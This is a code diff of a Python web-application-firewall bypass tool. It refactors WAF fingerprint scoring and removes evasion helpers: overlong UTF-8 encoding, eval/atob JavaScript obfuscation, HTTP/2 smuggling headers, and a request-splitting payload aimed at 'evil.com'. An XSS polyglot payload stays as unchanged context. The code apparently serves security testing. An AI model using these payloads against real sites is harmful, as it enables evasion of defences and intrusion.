@@ -584,23 +584,9 @@ class EncodingEngine:
         return "".join(result)
 
     @staticmethod
-    def base64_encode(payload: str) -> str:
-        """Base64 encoding."""
-        return base64.b64encode(payload.encode()).decode()
-
-    @staticmethod
     def hex_encode(payload: str) -> str:
         """Hex encoding: abc -> 0x616263"""
         return "0x" + binascii.hexlify(payload.encode()).decode()
-
-    @staticmethod
-    def overlong_utf8(char: str) -> bytes:
-        """Create overlong UTF-8 encoding for single char (CVE bypass technique)."""
-        code = ord(char)
-        if code < 0x80:
-            # 2-byte overlong
-            return bytes([0xC0 | (code >> 6), 0x80 | (code & 0x3F)])
-        return char.encode("utf-8")
 
     @staticmethod
     def null_byte_injection(payload: str) -> str:
@@ -865,21 +851,6 @@ class XSSBypassEngine:
         return """jaVasCript:/*-/*`/*\\`/*'/*"/**/(/* */oNcLiCk=alert() )//</stYle/</titLe/</teXtarEa/</scRipt/--!>\\x3csVg/<sVg/oNloAd=alert()//>\\x3e"""
 
     @classmethod
-    def obfuscate_js(cls, js_code: str) -> str:
-        """JavaScript obfuscation techniques."""
-        techniques = [
-            # String.fromCharCode
-            f"String.fromCharCode({','.join(str(ord(c)) for c in js_code)})",
-            # eval with encoding
-            f"eval(atob('{base64.b64encode(js_code.encode()).decode()}'))",
-            # Constructor technique
-            f"[].constructor.constructor('{js_code}')()",
-            # Template literal
-            f"`${{'{js_code}'}}`",
-        ]
-        return secrets.choice(techniques)
-
-    @classmethod
     def case_mutation(cls, tag: str) -> str:
         """Random case mutation for tags."""
         return "".join(
@@ -1053,21 +1024,6 @@ class HTTPBypassEngine:
         }
         return headers
 
-    @classmethod
-    def http2_smuggling_headers(cls) -> dict[str, str]:
-        """HTTP/2 specific headers for smuggling attempts."""
-        return {
-            ":method": "POST",
-            ":path": "/",
-            "content-length": "0",
-            "transfer-encoding": "chunked",
-        }
-
-    @classmethod
-    def request_splitting(cls, payload: str) -> str:
-        """HTTP Request Splitting/Smuggling payload."""
-        return f"{payload}\r\n\r\nGET /admin HTTP/1.1\r\nHost: evil.com\r\n\r\n"
-
 
 # =============================================================================
 # MAIN WAF BYPASS ENGINE
@@ -1104,6 +1060,65 @@ class WAFBypassEngine:
             "chunked_encoding",
         ]
 
+    @staticmethod
+    def _score_headers(
+        signature: WAFSignature, response_headers: dict[str, str],
+    ) -> tuple[float, int]:
+        """Score header matches. Returns (matches, total_checks)."""
+        matches = 0.0
+        total_checks = 0
+        for header_name, expected_value in signature.headers.items():
+            total_checks += 1
+            header_value = response_headers.get(header_name.lower(), "")
+            if header_value:
+                matches += 2 if (expected_value and expected_value.lower() in header_value.lower()) else 1
+        if signature.server_header:
+            total_checks += 1
+            server = response_headers.get("server", "")
+            if signature.server_header.lower() in server.lower():
+                matches += 2
+        return matches, total_checks
+
+    @staticmethod
+    def _score_cookies_and_body(
+        signature: WAFSignature, cookies: list[str], body_lower: str,
+    ) -> tuple[float, int]:
+        """Score cookie and body pattern matches. Returns (matches, total_checks)."""
+        matches = 0.0
+        total_checks = 0
+        for cookie in signature.cookies:
+            total_checks += 1
+            if any(cookie.lower() in c.lower() for c in cookies):
+                matches += 1.5
+        for pattern in signature.body_patterns:
+            total_checks += 1
+            if pattern.lower() in body_lower:
+                matches += 2
+        return matches, total_checks
+
+    def _score_waf_signature(
+        self,
+        signature: WAFSignature,
+        response_headers: dict[str, str],
+        response_body: str,
+        status_code: int,
+        cookies: list[str],
+    ) -> float:
+        """Score how well a WAF signature matches the response."""
+        hdr_matches, hdr_checks = self._score_headers(signature, response_headers)
+        cb_matches, cb_checks = self._score_cookies_and_body(
+            signature, cookies, response_body.lower(),
+        )
+        total_checks = hdr_checks + cb_checks
+        matches = hdr_matches + cb_matches
+
+        if signature.status_codes:
+            total_checks += 1
+            if status_code in signature.status_codes:
+                matches += 1
+
+        return matches / total_checks if total_checks > 0 else 0.0
+
     def fingerprint_waf(
         self,
         response_headers: dict[str, str],
@@ -1127,48 +1142,9 @@ class WAFBypassEngine:
         best_confidence = 0.0
 
         for waf_type, signature in WAF_SIGNATURES.items():
-            confidence = 0.0
-            matches = 0
-            total_checks = 0
-
-            # Check headers
-            for header_name, expected_value in signature.headers.items():
-                total_checks += 1
-                header_value = response_headers.get(header_name.lower(), "")
-                if header_value:
-                    if expected_value and expected_value.lower() in header_value.lower():
-                        matches += 2
-                    else:
-                        matches += 1
-
-            # Check server header
-            if signature.server_header:
-                total_checks += 1
-                server = response_headers.get("server", "")
-                if signature.server_header.lower() in server.lower():
-                    matches += 2
-
-            # Check cookies
-            for cookie in signature.cookies:
-                total_checks += 1
-                if any(cookie.lower() in c.lower() for c in cookies):
-                    matches += 1.5
-
-            # Check body patterns
-            for pattern in signature.body_patterns:
-                total_checks += 1
-                if pattern.lower() in response_body.lower():
-                    matches += 2
-
-            # Check status codes
-            if signature.status_codes:
-                total_checks += 1
-                if status_code in signature.status_codes:
-                    matches += 1
-
-            if total_checks > 0:
-                confidence = matches / total_checks
-
+            confidence = self._score_waf_signature(
+                signature, response_headers, response_body, status_code, cookies,
+            )
             if confidence > best_confidence:
                 best_confidence = confidence
                 best_match = waf_type
